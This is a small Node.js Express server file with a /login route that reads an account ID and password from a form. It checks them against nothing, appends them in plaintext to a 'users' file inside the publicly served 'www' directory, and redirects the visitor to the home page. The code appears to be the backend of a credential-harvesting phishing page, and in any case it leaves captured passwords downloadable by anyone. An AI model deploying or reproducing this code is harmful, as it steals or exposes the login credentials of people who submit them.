require('dotenv').config();

const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse URL-encoded form data
app.use(express.urlencoded({ extended: true }));

// Serve static files from the 'www' directory
app.use(express.static(path.join(__dirname, 'www')));

// Root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'index.html'));
});

app.get('/pass', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'pass.html'));
});

app.post('/login', (req, res) => {
  const accId = req.body['acc-id'];
  const accPass = req.body['acc-pass'];

  if (!accId || !accPass) {
    return res.status(400).send('Missing acc-id or acc-pass');
  }

  const logData = `ID: ${accId}\nPASS: ${accPass}\n=====\n`;

  fs.appendFile(path.join(__dirname, 'www', 'users'), logData, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Server error');
    }

    res.redirect('/');
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
